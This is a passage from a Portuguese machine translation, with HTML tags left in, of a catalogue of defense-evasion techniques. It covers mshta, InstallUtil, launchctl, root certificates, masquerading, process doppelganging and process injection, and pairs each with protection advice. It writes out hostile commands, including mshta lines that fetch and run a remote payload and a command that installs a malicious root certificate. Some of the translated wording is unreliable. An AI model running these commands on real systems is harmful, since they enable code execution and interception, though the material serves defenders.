e autentica√ß√£o adequadas, restrinja a capacidade dos advers√°rios de elevar privil√©gios. </font><font style="vertical-align: inherit;">Use ferramentas para ofuscar e criptografar arquivos de log quando armazenados localmente e durante a transfer√™ncia. </font><font style="vertical-align: inherit;">Monitore os logs para o evento 1102: "O log de auditoria foi exclu√≠do."</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Execu√ß√£o de Comando Indireto</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> V√°rios utilit√°rios do Windows podem ser usados ‚Äã‚Äãpara executar comandos, possivelmente sem chamar o cmd. Por exemplo, o Forfiles, o assistente de compatibilidade de programas (pcalua.exe), componentes do subsistema Windows para Linux (WSL), bem como outros utilit√°rios, podem fazer com que programas e comandos sejam executados na interface da linha de comandos, na janela Executar ou por meio de scripts. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os invasores podem abusar dos utilit√°rios descritos acima, a fim de ignorar as ferramentas de seguran√ßa, principalmente para o lan√ßamento arbitr√°rio de arquivos at√© que sua atividade seja detectada ou bloqueada por v√°rios meios, por exemplo, usando pol√≠ticas de grupo que pro√≠bem o uso de CMD. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identifique e bloqueie software potencialmente perigoso e mal-intencionado usando o AppLocker e as pol√≠ticas de restri√ß√£o de software. </font><font style="vertical-align: inherit;">Esses mecanismos podem ser usados ‚Äã‚Äãpara desativar ou restringir o acesso do usu√°rio a utilit√°rios que podem ser usados ‚Äã‚Äãpara executar comandos indiretamente.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instalar certificado raiz</font></font></a> </h3><br>  <i>Sistema:</i> Windows, Linux, macOS <br>  <i>Direitos:</i> Administrador, usu√°rio <br>  <i>Descri√ß√£o: os</i> certificados raiz s√£o usados ‚Äã‚Äãpara identificar uma autoridade de certifica√ß√£o (CA).  Quando o certificado raiz √© instalado, o sistema e os aplicativos confiar√£o em todos os certificados na cadeia de certificados raiz.  Os certificados geralmente s√£o usados ‚Äã‚Äãpara estabelecer conex√µes TLS / SSL seguras em um navegador da web.  Se um usu√°rio tentar abrir um site no qual um certificado n√£o confi√°vel √© apresentado, uma mensagem de erro ser√° exibida avisando o usu√°rio sobre um risco √† seguran√ßa.  Dependendo das configura√ß√µes de seguran√ßa, o navegador pode proibir conex√µes com sites n√£o confi√°veis. <br><br>  A instala√ß√£o de um certificado raiz em um sistema atacado permite que um invasor reduza o n√≠vel geral de seguran√ßa do sistema.  Os invasores podem usar esse m√©todo para ocultar avisos de seguran√ßa, como resultado do qual o usu√°rio se conectar√° via HTTPS a servidores da Web controlados pelo inimigo para roubar suas credenciais. <br>  Certificados raiz estranhos tamb√©m podem ser pr√©-instalados pelo fabricante do software durante a cadeia de suprimento de software e usados ‚Äã‚Äãem conjunto com malware e adware, ou para fornecer um ataque de "pessoa do meio" para interceptar informa√ß√µes transmitidas por conex√µes TLS / SSL seguras. <br>  Os certificados raiz tamb√©m podem ser clonados e reinstalados.  essas cadeias de certificados podem ser usadas para assinar c√≥digos maliciosos, a fim de ignorar as ferramentas de verifica√ß√£o de assinaturas usadas para bloquear e detectar invas√µes. <br><br>  No macOS, o malware Ay MaMi usa o comando <i>/ usr / bin / security add-trust-cert -d -r trustRoot -k / Library / Keychains / System / keychain path / para / malicioso / cert</i> para definir o certificado como certificado raiz confi√°vel em cadeia do sistema. <br><br>  <i>Recomenda√ß√µes de seguran√ßa:</i> O HPKP (HTTP Public Key Pinning) √© uma maneira de proteger contra ataques da cadeia de certificados.  O HPKP assume que o servidor informa ao cliente um conjunto de hashes de chave p√∫blica, que devem ser os √∫nicos confi√°veis ‚Äã‚Äãao se conectar a esse servidor por um determinado per√≠odo. <br><br>  A Diretiva de Grupo do Windows pode ser usada para gerenciar certificados raiz e impedir que n√£o administradores instalem certificados raiz adicionais em reposit√≥rios de usu√°rios (HKCUs): <br><br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Policies \ Microsoft \ SystemCertificates \ Root \ ProtectedRoots \ Flags = 1.</i> <br><br>  √â improv√°vel que os certificados raiz do sistema sejam alterados com frequ√™ncia, portanto, durante o monitoramento de novos certificados, √© poss√≠vel detectar atividades maliciosas ou garantir que n√£o haja certificados desnecess√°rios ou suspeitos.  A Microsoft fornece uma lista de certificados raiz confi√°veis ‚Äã‚Äãpor meio do authroot.stl.  O utilit√°rio Sysinternals Sigcheck pode ser usado para despejar o conte√∫do do armazenamento de certificados (Sigcheck [64] .exe -tuv) e identificar certificados n√£o inclu√≠dos na Lista de Confiabilidade de Certificados da Microsoft. <br><br>  Os certificados raiz instalados est√£o localizados no registro nas seguintes se√ß√µes: <br><br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ EnterpriseCertificates \ Root \ Certificates</i> <i><br></i>  <i>HKEY_LOCAL_MACHINE [HKEY_CURRENT_USER] \ SOFTWARE [\ Policies] \ Microsoft \ SystemCertificates \ Root \ Certificates</i> <br><br>  H√° um subconjunto de certificados raiz que s√£o constantemente usados ‚Äã‚Äãnos sistemas Windows que podem ser usados ‚Äã‚Äãpara monitorar: <br><br>  ‚Ä¢ 18F7C1FCC3090203FD5BAA2F861A754976C8DD25; <br>  ‚Ä¢ 245C97DF7514E7CF2DF8BE72AE957B9E04741E85; <br>  ‚Ä¢ 3B1EFD3A66EA28B16697394703A72CA340A05BD5; <br>  ‚Ä¢ 7F88CD7223F3C813818C994614A89C99FA3B5247; <br>  ‚Ä¢ 8F43288AD272F3103B6FB1428485EA3014C0BCFE; <br>  ‚Ä¢ A43489159A520F0D93D032CCAF37E7FE20A8B419; <br>  ‚Ä¢ BE36A4562FB2EE05DBB3D32323ADF445084ED656; <br>  ‚Ä¢ CDD4EEAE6000AC7F40C3802C171E30148030C072. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">InstallUtil</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o:</i> InstallUtil √© um utilit√°rio de linha de comando do Windows que pode instalar e desinstalar aplicativos em conformidade com as especifica√ß√µes do .NET Framework.  O Installutil √© instalado automaticamente com o VisualStudio.  O arquivo InstallUtil.exe √© assinado por um certificado da Microsoft e armazenado em: <br><br>  <i>C: \ Windows \ Microsoft.NET \ Framework \ v [vers√£o] \ InstallUtil.exe</i> <br><br>  Os invasores podem usar a funcionalidade InstallUtil para executar a execu√ß√£o de c√≥digos de proxy e ignorar as listas de permiss√µes de aplicativos. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> √â poss√≠vel que o InstallUtil n√£o seja usado no seu sistema, considere bloquear a instala√ß√£o do InstallUtil.exe. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">LC_MAIN seq√ºestro</a> </h3><br>  <i>Sistema:</i> macOS <br>  <i>Direitos:</i> Usu√°rio, Administrador <br>  <i>Descri√ß√£o:</i> A partir do OS X 10.8, o cabe√ßalho LC_MAIN √© inclu√≠do nos execut√°veis ‚Äã‚Äãdo mach-O, que indica o ponto de entrada do c√≥digo bin√°rio para execut√°-lo.  Nas vers√µes anteriores, dois cabe√ßalhos LC_THREAD e LC_UNIXTHREAD eram usados.  O ponto de entrada do bin√°rio pode ser modificado e a adi√ß√£o mal-intencionada ser√° executada inicialmente e, em seguida, a execu√ß√£o retornar√° ao ponto de partida para que a v√≠tima n√£o note nada.  Essa modifica√ß√£o de arquivos bin√°rios √© uma maneira de ignorar a lista branca de aplicativos, porque o nome do arquivo e o caminho para o aplicativo permanecer√£o inalterados. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> use aplicativos que tenham apenas assinaturas digitais v√°lidas de desenvolvedores confi√°veis.  A modifica√ß√£o do cabe√ßalho LC_MAIN invalidar√° a assinatura do arquivo e alterar√° a soma de verifica√ß√£o do arquivo. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Launchctl</a> </h3><br>  <i>Sistema:</i> macOS <br>  <i>Direitos:</i> Usu√°rio, Administrador <br>  <i>Descri√ß√£o:</i> Launchctl - um utilit√°rio para gerenciar o servi√ßo Launchd.  Usando o Launchctl, voc√™ pode gerenciar os servi√ßos do sistema e do usu√°rio (LaunchDeamons e LaunchAgents), bem como executar comandos e programas.  O Launchctl suporta subcomandos da linha de comando, interativos ou redirecionados da entrada padr√£o: <br><br>  <i>launchctl submit -l [labelname] - / Caminho / para / coisa / para / execute '' arg "'' arg" '' arg "</i> . <br><br>  Ao iniciar e reiniciar servi√ßos e daemons, os atacantes podem executar c√≥digo e at√© ignorar a lista de permiss√µes se o launchctl for um processo autorizado; no entanto, carregar, descarregar e reiniciar servi√ßos e daemons podem exigir privil√©gios elevados. <br><br>  <i>Recomenda√ß√µes de seguran√ßa:</i> Limitando os direitos do usu√°rio para criar Agentes de Inicializa√ß√£o e iniciar Deamons de Inicializa√ß√£o usando a Diretiva de Grupo.  Usando o aplicativo <i>KnockKnock</i> , <i>voc√™</i> pode descobrir programas que usam o launchctl para gerenciar os Agentes de Inicializa√ß√£o e os Deamons de Inicializa√ß√£o. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Mascarada</a> </h3><br>  <i>Sistema:</i> Windows, Linux, macOS <br>  <i>Descri√ß√£o: o</i> disfarce ocorre quando o nome ou o local de um arquivo execut√°vel, legal ou malicioso, √© sujeito a v√°rias manipula√ß√µes e abusos, a fim de burlar a prote√ß√£o.  V√°rias op√ß√µes de mascaramento s√£o conhecidas. <br>  Uma op√ß√£o √© que o execut√°vel seja colocado em um diret√≥rio geralmente aceito ou receba o nome de um programa leg√≠timo e confi√°vel.  O nome do arquivo pode ser semelhante ao nome de um programa leg√≠timo.  Esse m√©todo de mascaramento √© usado para ignorar ferramentas que confiam em arquivos com base no nome ou caminho do arquivo, al√©m de enganar os administradores de sistema. <br><br>  <b>Windows</b> <br>  Outra maneira de maximizar √© o invasor usar uma c√≥pia modificada de um utilit√°rio leg√≠timo, como o rundll32.exe.  Nesse caso, um utilit√°rio leg√≠timo pode ser movido para outro diret√≥rio e renomeado para evitar a detec√ß√£o com base no monitoramento do lan√ßamento de utilit√°rios do sistema a partir de locais fora do padr√£o. <br>  Um exemplo de abuso de diret√≥rios confi√°veis ‚Äã‚Äãno Windows √© o diret√≥rio C: \ Windows \ System32.  Os nomes dos utilit√°rios de sistema confi√°veis, como explorer.exe ou svchost.exe, podem ser atribu√≠dos a bin√°rios maliciosos. <br><br>  <b>Linux</b> <br>  O pr√≥ximo m√©todo de mascaramento √© usar arquivos bin√°rios maliciosos que, ap√≥s iniciar, alteram o nome do processo para o nome de um processo leg√≠timo e confi√°vel.  Um exemplo de diret√≥rio confi√°vel no Linux √© o diret√≥rio / bin, e nomes como rsyncd ou dbus-inotifier podem ser nomes confi√°veis. <br><br>  <i>Recomenda√ß√µes de</i> seguran√ßa <i>:</i> Ao criar v√°rias regras de seguran√ßa, evite exce√ß√µes com base no nome e no caminho do arquivo.  Requer assinatura de arquivos bin√°rios.  Use os controles de acesso do sistema de arquivos para proteger diret√≥rios confi√°veis, como C: \ Windows \ System32.  N√£o use ferramentas para restringir a execu√ß√£o de programas com base no nome ou no caminho do arquivo. <br><br>  Identifique e bloqueie software potencialmente perigoso e mal-intencionado que possa parecer um programa leg√≠timo. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Modificar registro</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio, administrador, sistema <br>  <i>Descri√ß√£o: os</i> invasores podem modificar o registro para ocultar informa√ß√µes nas chaves do registro ou excluir informa√ß√µes durante a limpeza dos tra√ßos de uma invas√£o ou em outros est√°gios do ataque. <br><br>  O acesso a determinadas √°reas do registro depende das permiss√µes da conta.  O utilit√°rio Reg interno pode ser usado para modifica√ß√£o local e remota do registro.  Outras ferramentas de acesso remoto que interagem com o registro por meio da API do Windows podem ser usadas. <br><br>  Altera√ß√µes no registro podem incluir a√ß√µes para ocultar as chaves, por exemplo, adicionando chaves com um nome a partir de um caractere nulo.  A leitura dessa chave por meio de Reg ou API resultar√° em um erro ou ser√° ignorada.  Os invasores podem usar essas pseudo-chaves ocultas para ocultar a carga √∫til e os comandos usados ‚Äã‚Äãno processo de consolida√ß√£o no sistema. <br><br>  O registro do sistema remoto tamb√©m pode ser alterado se o servi√ßo Registro Remoto estiver ativo no sistema de destino.  Normalmente, um invasor tamb√©m precisa de credenciais v√°lidas, al√©m de acesso aos compartilhamentos de administra√ß√£o do Windows para usar o RPC. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> A configura√ß√£o incorreta de permiss√µes no registro pode levar o invasor a executar c√≥digo arbitr√°rio ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Fraqueza nas permiss√µes do Registro de Servi√ßo</a> ).  Verifique se os usu√°rios n√£o podem alterar as chaves dos componentes do sistema.  Bloqueie utilit√°rios de sistema desnecess√°rios e outros softwares que podem ser usados ‚Äã‚Äãpara modificar o registro.  Considere ativar a auditoria do registro (ID do evento 4657), mas lembre-se de que as altera√ß√µes feitas no Registro usando ferramentas como RegHide n√£o ser√£o registradas pelo servi√ßo de coleta de eventos do SO <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Mshta</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o:</i> Mshta.exe (localizado em <i>C: \ Windows \ System32 \</i> ) √© um utilit√°rio que executa aplicativos HTML da Microsoft (* .HTA).  Os aplicativos HTA s√£o executados usando as mesmas tecnologias que o InternetExplorer usa, mas fora do navegador.  Devido ao fato de o Mshta processar arquivos ignorando as configura√ß√µes de seguran√ßa do navegador, os atacantes podem usar o mshta.exe para proxy a execu√ß√£o de arquivos HTA maliciosos, Javascript ou VBScript.  O arquivo malicioso pode ser iniciado por meio do script interno: <br><br>  <i>mshta vbscript: Close (Execute ("GetObject (" "script: https [:] // servidor da web / carga √∫til [.] sct" ")")))</i> <br><br>  ou diretamente, no URL: <br><br>  <i>mshta http [:] // servidor web / carga √∫til [.] hta</i> <br><br>  <i>Recomenda√ß√µes de prote√ß√£o: A</i> funcionalidade do mshta.exe est√° associada a vers√µes mais antigas do IE que atingiram o final de seu ciclo de vida.  Bloqueie o Mshta.exe se voc√™ n√£o estiver usando sua funcionalidade. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Atributos de arquivo NTFS</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Descri√ß√£o: a</i> se√ß√£o NTFS cont√©m a MFT (Master File Table), que armazena dados sobre o conte√∫do do volume, as linhas correspondem aos arquivos e as colunas aos seus atributos, incluindo atributos como Atributos estendidos (EA) - uma sequ√™ncia de 64 kb) e Fluxos alternativos (Fluxos de dados alternativos (ADS) - metadados de tamanho arbitr√°rio) que podem ser usados ‚Äã‚Äãpara armazenar quaisquer dados.  Os invasores podem armazenar dados maliciosos e arquivos bin√°rios em atributos estendidos e metadados de arquivo.  Essa t√©cnica permite ignorar algumas ferramentas de prote√ß√£o, como ferramentas de verifica√ß√£o est√°tica baseadas em indicadores e algumas ferramentas antiv√≠rus. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o: O</i> bloqueio do acesso ao EA e ADS pode ser bastante complexo e inadequado e, al√©m disso, levar √† opera√ß√£o inst√°vel da funcionalidade padr√£o do SO.  Direcione o vetor de prote√ß√£o para impedir que o software seja iniciado, com o qual voc√™ pode ocultar informa√ß√µes no EA e no ADS. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Removendo conex√µes com recursos de rede (Remo√ß√£o de Conex√£o de Compartilhamento de Rede)</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Administrador, usu√°rio <br>  <i>Descri√ß√£o: as</i> conex√µes com as pastas de rede e o Windows Admin Share podem ser exclu√≠das se n√£o forem mais necess√°rias.  Net √© um exemplo de utilit√°rio que pode ser usado para remover conex√µes de rede: <i>net use \ system \ share / delete</i> .  Os oponentes podem remover as conex√µes de rede que n√£o precisam para limpar os tra√ßos de intrus√£o. <br><br>  <i>Dicas de seguran√ßa:</i> siga as pr√°ticas recomendadas para organizar compartilhamentos de administrador do Windows.  Identifique utilit√°rios e software de sistema desnecess√°rios que podem ser usados ‚Äã‚Äãpara conectar-se a compartilhamentos de rede e considere auditar seu uso ou bloqueio. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Arquivos ou informa√ß√µes ofuscados</a> </h3><br>  <i>Sistema:</i> Windows, Linux, macOS <br>  <i>Descri√ß√£o: os</i> invasores podem usar criptografia, criptografia e todos os tipos de m√©todos para ofuscar arquivos e seu conte√∫do no sistema ou durante sua transfer√™ncia. <br>  As cargas √∫teis podem ser arquivadas ou criptografadas; algumas vezes, para desofusca√ß√£o e inicializa√ß√£o subsequente, √© necess√°ria alguma a√ß√£o do usu√°rio, por exemplo, digite uma senha para abrir um arquivo preparado por um invasor. <br><br>  Para ocultar linhas de texto sem formata√ß√£o, partes dos arquivos tamb√©m podem ser codificadas.  As cargas √∫teis podem ser divididas em arquivos "benignos" separados que, quando montados como um todo, executam funcionalidades maliciosas. <br><br>  Os oponentes tamb√©m podem ofuscar comandos chamados de cargas √∫teis diretamente ou atrav√©s da interface da linha de comandos.  Vari√°veis ‚Äã‚Äãde ambiente, aliases e caracteres espec√≠ficos da sem√¢ntica de plataforma ou idioma podem ser usados ‚Äã‚Äãpara ignorar a detec√ß√£o de malware com base em assinaturas e listas de permiss√µes. <br><br>  Outro exemplo de ofusca√ß√£o √© o uso da esteganografia - a t√©cnica de ocultar dados ou c√≥digos em imagens, faixas de √°udio, arquivos de v√≠deo e texto. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> use ferramentas de an√°lise e detec√ß√£o de malware que verificam n√£o apenas o c√≥digo fonte, mas tamb√©m analisam o processo de execu√ß√£o de comandos.  No Windows 10, essa funcionalidade √© apresentada como AMSI (Antimalware Scan Interface). <br><br>  A presen√ßa de caracteres de escape em comandos, como ^ ou ", pode servir como um indicador de ofusca√ß√£o. Usando o Windows Sysmon e o evento 4688 de identifica√ß√£o de evento, √© poss√≠vel visualizar os argumentos dos comandos executados em v√°rios processos. <br><br>  A ofusca√ß√£o usada nas cargas √∫teis durante a fase de acesso inicial pode ser detectada na rede usando o sistema IDS e os gateways de seguran√ßa de e-mail que identificam dados e scripts compactados e criptografados nos arquivos anexados.  A identifica√ß√£o de cargas transmitidas atrav√©s de uma conex√£o criptografada de um site pode ser feita inspecionando o tr√°fego criptografado. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Modifica√ß√£o de Plist</a> </h3><br>  <i>Sistema:</i> macOS <br>  <i>Direitos:</i> Usu√°rio, Administrador <br>  <i>Descri√ß√£o: os</i> invasores podem modificar arquivos plist especificando neles seu pr√≥prio c√≥digo para sua execu√ß√£o no contexto de outro usu√°rio.  Os arquivos de propriedades plist localizados em / Library / Preferences s√£o executados com privil√©gios elevados, e os arquivos plist de ~ / Library / Preferences s√£o executados com privil√©gios de usu√°rio. <br><br>  Dicas de seguran√ßa <i>:</i> impe√ßa que os arquivos plist sejam modificados, tornando-os somente leitura. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Porto batendo</a> </h3><br>  <i>Sistema:</i> Linux, macOS <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o: os</i> invasores podem usar os m√©todos de Port Knocking para ocultar portas abertas que eles usam para se conectar ao sistema. <br><br>  Dicas de <i>seguran√ßa: O</i> uso de firewalls com estado pode impedir que algumas op√ß√µes de Port Knocking sejam implementadas. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Processar doppelganging</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio, Administrador, Sistema <br>  <i>Descri√ß√£o:</i> NTFS transacional (TxF) √© uma tecnologia introduzida pela primeira vez no Vista que permite opera√ß√µes de arquivo usando transa√ß√µes.  No TxF, apenas um descritor de transa√ß√£o pode gravar o arquivo no momento, todos os outros descritores ser√£o isolados e s√≥ poder√£o ler a vers√£o do arquivo bloqueado no momento da abertura.  Se o sistema ou aplicativo travar, o TxF reverter√° automaticamente as altera√ß√µes no arquivo.  O TxF ainda est√° inclu√≠do no Windows 10. <br><br>  A t√©cnica Doppelganging do processo (do alem√£o ‚Äútransmiss√£o em dois est√°gios‚Äù, ‚Äúcurso duplo‚Äù) envolve o uso de fun√ß√µes WinAPI n√£o documentadas e √© implementada em 4 etapas: <br><br><ol><li>  Transa√ß√£o  Uma transa√ß√£o NTFS √© criada usando o execut√°vel atacado e uma vers√£o modificada tempor√°ria do execut√°vel √© criada como parte da transa√ß√£o. </li><li>  Baixar  Uma se√ß√£o compartilhada √© criada na mem√≥ria na qual uma vers√£o modificada do arquivo execut√°vel √© carregada. </li><li>  Revers√£o.  A transa√ß√£o NTFS √© revertida, como resultado do qual o arquivo atacado original √© salvo no disco em sua forma original. </li><li>  Anima√ß√£o.  Usando uma vers√£o modificada do arquivo execut√°vel que permanece na RAM, um processo √© criado e sua execu√ß√£o √© iniciada. </li></ol><br>  Assim, o c√≥digo malicioso funcionar√° no contexto de um processo confi√°vel leg√≠timo.  Dado que o ataque ocorre apenas na mem√≥ria, porque  Uma transa√ß√£o NTFS n√£o foi conclu√≠da, mas √© revertida; nenhum vest√≠gio de atividade maliciosa permanecer√° no disco. <br><br>  <i>Dicas de seguran√ßa:</i> medidas de seguran√ßa preventivas na forma de tentativas de bloquear determinadas chamadas de API provavelmente ter√£o efeitos colaterais negativos.  O vetor de prote√ß√£o deve ser direcionado para impedir o lan√ßamento de ferramentas maliciosas em est√°gios anteriores da cadeia de ataques.  Doppelganging pode ser usado para burlar os recursos de seguran√ßa; no entanto, ainda √© uma boa pr√°tica bloquear aplicativos potencialmente perigosos e limitar o uso de software usando listas de permiss√µes.  A detec√ß√£o de ataque √© realizada analisando chamadas para as fun√ß√µes da API CreateTransaction, CreateFileTransacted, RollbackTransaction, fun√ß√µes n√£o documentadas como chamadas NTCreateProcessEX, NtCreateThreadEX e API usadas para alterar a mem√≥ria em outro processo, como WriteProcessMemory. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Processo oco</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o: o</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ataque √© realizado substituindo a imagem do arquivo execut√°vel do processo durante a suspens√£o do processo. </font><font style="vertical-align: inherit;">Est√° </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">entre as dez t√©cnicas b√°sicas para injetar processos</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dicas de seguran√ßa:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> medidas de seguran√ßa preventivas na forma de tentativas de bloquear determinadas chamadas de API provavelmente ter√£o efeitos colaterais negativos. </font><font style="vertical-align: inherit;">O vetor de prote√ß√£o deve ser direcionado para impedir o lan√ßamento de ferramentas maliciosas em est√°gios anteriores da cadeia de ataques. </font><font style="vertical-align: inherit;">O Process Hollowing pode ser usado para contornar os recursos de seguran√ßa; no entanto, continua a ser uma boa pr√°tica bloquear aplicativos potencialmente perigosos e limitar o uso de software usando listas brancas.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inje√ß√£o de c√≥digo em um processo (inje√ß√£o de processo), </font></font></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dez t√©cnicas de inje√ß√£o de processo</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio, administrador, sistema, raiz </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> A inje√ß√£o de processo √© um m√©todo de execu√ß√£o de c√≥digo arbitr√°rio no espa√ßo de endere√ßo de um processo ativo separado. A execu√ß√£o de c√≥digo no contexto de outro processo permite acessar a mem√≥ria do processo injetado, recursos do sistema / rede e possivelmente privil√©gios elevados. As inje√ß√µes de processo tamb√©m podem ser usadas para evitar a poss√≠vel detec√ß√£o de atividades maliciosas por meios de seguran√ßa. As t√©cnicas para implementar as inje√ß√µes nos processos s√£o baseadas no abuso de v√°rios mecanismos que garantem o multithreading da execu√ß√£o do programa no sistema operacional. A seguir, s√£o apresentadas algumas abordagens para injetar c√≥digo em um processo. </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows</font></font></b> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ inje√ß√µes de DLL. Eles s√£o executados escrevendo o caminho para a DLL maliciosa dentro do processo e, em seguida, executando-o criando um thread remoto (thread remoto - um thread que √© executado no espa√ßo de endere√ßo virtual de outro processo). Em outras palavras, o malware grava a DLL no disco e usa uma fun√ß√£o como CreateRemoteTread, que chamar√° a fun√ß√£o LoadLibrary no processo injetado. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ As inje√ß√µes de PE (inje√ß√£o execut√°vel port√°til) s√£o baseadas no abuso de recursos de execu√ß√£o de mem√≥ria de arquivos PE, como DLL ou EXE. O c√≥digo malicioso √© gravado no processo sem gravar nenhum arquivo no disco e, em seguida, a execu√ß√£o √© chamada usando o c√≥digo adicional ou criando um fluxo remoto.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ O seq√ºestro de execu√ß√£o de encadeamento envolve a inje√ß√£o de c√≥digos maliciosos ou caminhos de DLL diretamente no encadeamento do processo. Como a t√©cnica Process Hollowing, o fluxo deve primeiro ser suspenso. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ A inje√ß√£o em uma inje√ß√£o de chamada de procedimento ass√≠ncrona (APC) envolve a incorpora√ß√£o de c√≥digo malicioso na fila da APC de um encadeamento de processo. Um dos m√©todos de inje√ß√£o da APC, chamado ‚Äúinje√ß√£o Earle Bird‚Äù, envolve a cria√ß√£o de um processo suspenso no qual o c√≥digo malicioso pode ser gravado e iniciado no ponto de entrada do processo pela APC. AtomBombing √© outra op√ß√£o de inje√ß√£o que usa a APC para chamar c√≥digo malicioso previamente gravado na tabela global de √°tomos.</font></font><br><font style="vertical-align: 